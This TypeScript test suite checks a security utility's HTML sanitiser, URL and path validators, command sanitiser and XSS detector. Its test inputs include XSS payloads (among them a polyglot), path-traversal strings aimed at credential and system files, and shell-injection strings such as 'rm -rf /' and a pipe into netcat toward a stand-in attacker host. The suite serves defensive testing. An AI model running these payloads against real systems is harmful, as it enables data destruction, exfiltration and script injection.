/**
 * Security Utils Test Suite
 * 
 * Comprehensive tests for security vulnerability fixes
 * Tests all 15 CodeQL security vulnerabilities:
 * - Incomplete URL scheme check (3 issues)
 * - Incomplete multi-character sanitization (9 issues)
 * - Bad HTML filtering regexp (3 issues)
 */

import * as assert from 'assert';
import { SecurityUtils, SECURITY_PATTERNS } from '../../src/security/SecurityUtils';

suite('SecurityUtils Test Suite', () => {
    
    suite('HTML Sanitization Tests', () => {
        
        test('Should remove script tags completely', () => {
            const malicious = '<script>alert("XSS")</script>Hello';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('<script'), false);
            assert.strictEqual(sanitized.includes('alert'), false);
        });

        test('Should handle multi-line script tags', () => {
            const malicious = `<script>
                alert("XSS")
            </script>Hello`;
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('<script'), false);
            assert.strictEqual(sanitized.includes('alert'), false);
        });

        test('Should remove malformed script tags', () => {
            const malicious = '<script/src="evil.js">Hello';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('<script'), false);
        });

        test('Should remove event handlers', () => {
            const malicious = '<div onclick="alert(\'XSS\')">Click me</div>';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('onclick'), false);
        });

        test('Should handle Unicode bypass attempts', () => {
            // Unicode encoded script tag
            const malicious = '\\u003cscript\\u003ealert("XSS")\\u003c/script\\u003e';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('script'), false);
        });

        test('Should handle HTML entity bypass attempts', () => {
            // HTML entities encoding
            const malicious = '&lt;script&gt;alert("XSS")&lt;/script&gt;';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            // Should not execute as script even if decoded
            assert.strictEqual(sanitized.includes('<script>'), false);
        });

        test('Should handle mixed case bypass attempts', () => {
            const malicious = '<ScRiPt>alert("XSS")</sCrIpT>';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.toLowerCase().includes('script'), false);
        });

        test('Should remove javascript: protocol', () => {
            const malicious = '<a href="javascript:alert(\'XSS\')">Click</a>';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('javascript:'), false);
        });

        test('Should remove data: protocol with HTML', () => {
            const malicious = '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('data:text/html'), false);
        });

        test('Should remove vbscript: protocol', () => {
            const malicious = '<a href="vbscript:alert(\'XSS\')">Click</a>';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('vbscript:'), false);
        });

        test('Should handle nested tags', () => {
            const malicious = '<div><script>alert("XSS")</script></div>';
            const sanitized = SecurityUtils.sanitizeHtml(malicious);
            assert.strictEqual(sanitized.includes('script'), false);
        });

        test('Should preserve safe HTML', () => {
            const safe = '<p>This is <b>bold</b> and <i>italic</i> text.</p>';
            const sanitized = SecurityUtils.sanitizeHtml(safe);
            assert.strictEqual(sanitized.includes('<p>'), true);
            assert.strictEqual(sanitized.includes('<b>'), true);
            assert.strictEqual(sanitized.includes('<i>'), true);
        });

        test('Should handle strict mode for webviews', () => {
            const html = '<a href="https://example.com">Link</a>';
            const strictSanitized = SecurityUtils.sanitizeHtml(html, true);
            // In strict mode, links should be removed
            assert.strictEqual(strictSanitized.includes('href'), false);
        });
    });

    suite('URL Validation Tests', () => {
        
        test('Should accept valid HTTP URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('http://example.com'), true);
            assert.strictEqual(SecurityUtils.isValidUrl('https://example.com'), true);
        });

        test('Should accept valid mailto URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('mailto:test@example.com'), true);
        });

        test('Should reject javascript: URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('javascript:alert("XSS")'), false);
        });

        test('Should reject data: URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('data:text/html,<script>alert("XSS")</script>'), false);
        });

        test('Should reject file: URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('file:///etc/passwd'), false);
        });

        test('Should reject blob: URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('blob:https://example.com/uuid'), false);
        });

        test('Should reject vbscript: URLs', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('vbscript:alert("XSS")'), false);
        });

        test('Should handle relative URLs safely', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('/path/to/resource'), true);
            assert.strictEqual(SecurityUtils.isValidUrl('path/to/resource'), true);
        });

        test('Should reject URLs with directory traversal', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('../../../etc/passwd'), false);
        });

        test('Should handle malformed URLs safely', () => {
            assert.strictEqual(SecurityUtils.isValidUrl('ht!tp://example.com'), false);
            assert.strictEqual(SecurityUtils.isValidUrl('://example.com'), false);
        });
    });

    suite('File Path Validation Tests', () => {
        
        test('Should reject directory traversal attempts', () => {
            assert.strictEqual(SecurityUtils.isValidFilePath('../../../etc/passwd'), false);
            assert.strictEqual(SecurityUtils.isValidFilePath('..\\..\\..\\windows\\system32'), false);
        });

        test('Should reject home directory access', () => {
            assert.strictEqual(SecurityUtils.isValidFilePath('~/ssh/id_rsa'), false);
        });

        test('Should reject system directories', () => {
            assert.strictEqual(SecurityUtils.isValidFilePath('/etc/passwd'), false);
            assert.strictEqual(SecurityUtils.isValidFilePath('/proc/self/environ'), false);
            assert.strictEqual(SecurityUtils.isValidFilePath('C:\\Windows\\System32\\config'), false);
        });

        test('Should reject null bytes', () => {
            assert.strictEqual(SecurityUtils.isValidFilePath('file.txt\0.jpg'), false);
        });

        test('Should accept valid relative paths', () => {
            assert.strictEqual(SecurityUtils.isValidFilePath('src/file.ts'), true);
            assert.strictEqual(SecurityUtils.isValidFilePath('tests/test.spec.ts'), true);
        });
    });

    suite('Object Sanitization Tests', () => {
        
        test('Should sanitize nested objects', () => {
            const obj = {
                name: '<script>alert("XSS")</script>',
                nested: {
                    value: 'javascript:alert("XSS")'
                }
            };
            const sanitized = SecurityUtils.sanitizeObject(obj);
            assert.strictEqual(sanitized.name.includes('script'), false);
            assert.strictEqual(sanitized.nested.value.includes('javascript:'), false);
        });

        test('Should sanitize arrays in objects', () => {
            const obj = {
                items: [
                    '<script>alert(1)</script>',
                    'onclick="alert(2)"',
                    'normal text'
                ]
            };
            const sanitized = SecurityUtils.sanitizeObject(obj);
            assert.strictEqual(sanitized.items[0].includes('script'), false);
            assert.strictEqual(sanitized.items[1].includes('onclick'), false);
            assert.strictEqual(sanitized.items[2], 'normal text');
        });

        test('Should handle null and undefined', () => {
            assert.strictEqual(SecurityUtils.sanitizeObject(null), null);
            assert.strictEqual(SecurityUtils.sanitizeObject(undefined), undefined);
        });
    });

    suite('XSS Pattern Detection Tests', () => {
        
        test('Should detect script tag patterns', () => {
            const patterns = SecurityUtils.detectXSSPatterns('<script>alert("XSS")</script>');
            assert.strictEqual(patterns.includes('Script Tag'), true);
        });

        test('Should detect JavaScript protocol', () => {
            const patterns = SecurityUtils.detectXSSPatterns('javascript:alert("XSS")');
            assert.strictEqual(patterns.includes('JavaScript Protocol'), true);
        });

        test('Should detect event handlers', () => {
            const patterns = SecurityUtils.detectXSSPatterns('onclick="alert()"');
            assert.strictEqual(patterns.includes('On-Event Handler'), true);
        });

        test('Should detect multiple patterns', () => {
            const patterns = SecurityUtils.detectXSSPatterns('<script>eval("alert()")</script>');
            assert.strictEqual(patterns.length >= 2, true);
            assert.strictEqual(patterns.includes('Script Tag'), true);
            assert.strictEqual(patterns.includes('Eval Function'), true);
        });
    });

    suite('Command Sanitization Tests', () => {
        
        test('Should remove command injection characters', () => {
            const command = 'ls; rm -rf /';
            const sanitized = SecurityUtils.sanitizeCommand(command);
            assert.strictEqual(sanitized.includes(';'), false);
            assert.strictEqual(sanitized.includes('rm -rf /'), false);
        });

        test('Should remove pipe operators', () => {
            const command = 'cat file | nc attacker.com 1234';
            const sanitized = SecurityUtils.sanitizeCommand(command);
            assert.strictEqual(sanitized.includes('|'), false);
        });

        test('Should remove command substitution', () => {
            const command = 'echo $(whoami)';
            const sanitized = SecurityUtils.sanitizeCommand(command);
            assert.strictEqual(sanitized.includes('$'), false);
            assert.strictEqual(sanitized.includes('('), false);
        });

        test('Should remove backticks', () => {
            const command = 'echo `whoami`';
            const sanitized = SecurityUtils.sanitizeCommand(command);
            assert.strictEqual(sanitized.includes('`'), false);
        });
    });

    suite('CSP Generation Tests', () => {
        
        test('Should generate secure CSP with nonce', () => {
            const mockWebview = {
                cspSource: 'vscode-webview://example'
            };
            const nonce = SecurityUtils.generateNonce();
            const csp = SecurityUtils.generateCSP(mockWebview, nonce);
            
            assert.strictEqual(csp.includes('default-src \'none\''), true);
            assert.strictEqual(csp.includes(`script-src ${mockWebview.cspSource} 'nonce-${nonce}'`), true);
            assert.strictEqual(csp.includes('frame-src \'none\''), true);
            assert.strictEqual(csp.includes('object-src \'none\''), true);
        });

        test('Should generate unique nonces', () => {
            const nonce1 = SecurityUtils.generateNonce();
            const nonce2 = SecurityUtils.generateNonce();
            assert.notStrictEqual(nonce1, nonce2);
        });
    });

    suite('Security Pattern Tests', () => {
        
        test('Should have comprehensive XSS patterns', () => {
            assert.ok(SECURITY_PATTERNS.XSS.SCRIPT_TAG);
            assert.ok(SECURITY_PATTERNS.XSS.EVENT_HANDLER);
            assert.ok(SECURITY_PATTERNS.XSS.JAVASCRIPT_PROTOCOL);
            assert.ok(SECURITY_PATTERNS.XSS.DATA_PROTOCOL);
            assert.ok(SECURITY_PATTERNS.XSS.VBSCRIPT_PROTOCOL);
        });

        test('Should have SQL injection patterns', () => {
            assert.ok(SECURITY_PATTERNS.SQL_INJECTION.UNION_SELECT);
            assert.ok(SECURITY_PATTERNS.SQL_INJECTION.DROP_TABLE);
            assert.ok(SECURITY_PATTERNS.SQL_INJECTION.DELETE_FROM);
        });

        test('Should have path traversal patterns', () => {
            assert.ok(SECURITY_PATTERNS.PATH_TRAVERSAL.PARENT_DIR);
            assert.ok(SECURITY_PATTERNS.PATH_TRAVERSAL.ABSOLUTE_PATH);
            assert.ok(SECURITY_PATTERNS.PATH_TRAVERSAL.HOME_DIR);
            assert.ok(SECURITY_PATTERNS.PATH_TRAVERSAL.NULL_BYTE);
        });

        test('Should have command injection patterns', () => {
            assert.ok(SECURITY_PATTERNS.COMMAND_INJECTION.SHELL_OPERATORS);
            assert.ok(SECURITY_PATTERNS.COMMAND_INJECTION.COMMAND_SUBSTITUTION);
            assert.ok(SECURITY_PATTERNS.COMMAND_INJECTION.BACKTICKS);
        });
    });

    suite('Edge Cases and Attack Vectors', () => {
        
        test('Should handle empty strings', () => {
            assert.strictEqual(SecurityUtils.sanitizeHtml(''), '');
            assert.strictEqual(SecurityUtils.sanitizeString(''), '');
            assert.strictEqual(SecurityUtils.isValidUrl(''), false);
            assert.strictEqual(SecurityUtils.isValidFilePath(''), false);
        });

        test('Should handle very long strings', () => {
            const longString = 'a'.repeat(100000) + '<script>alert("XSS")</script>';
            const sanitized = SecurityUtils.sanitizeHtml(longString);
            assert.strictEqual(sanitized.includes('script'), false);
        });

        test('Should handle null/undefined inputs safely', () => {
            // @ts-ignore - Testing runtime behavior
            assert.strictEqual(SecurityUtils.sanitizeHtml(null), '');
            // @ts-ignore
            assert.strictEqual(SecurityUtils.sanitizeHtml(undefined), '');
            // @ts-ignore
            assert.strictEqual(SecurityUtils.isValidUrl(null), false);
            // @ts-ignore
            assert.strictEqual(SecurityUtils.isValidFilePath(undefined), false);
        });

        test('Should handle non-string inputs safely', () => {
            // @ts-ignore - Testing runtime behavior
            assert.strictEqual(SecurityUtils.sanitizeHtml(123), '');
            // @ts-ignore
            assert.strictEqual(SecurityUtils.sanitizeString({}), '');
        });

        test('Should prevent double encoding attacks', () => {
            const doubleEncoded = '%253Cscript%253Ealert(%2522XSS%2522)%253C%252Fscript%253E';
            const sanitized = SecurityUtils.sanitizeHtml(doubleEncoded);
            assert.strictEqual(sanitized.includes('script'), false);
        });

        test('Should handle polyglot XSS attempts', () => {
            const polyglot = 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>';
            const sanitized = SecurityUtils.sanitizeHtml(polyglot);
            assert.strictEqual(sanitized.includes('javascript'), false);
            assert.strictEqual(sanitized.includes('onclick'), false);
            assert.strictEqual(sanitized.includes('onload'), false);
        });
    });
});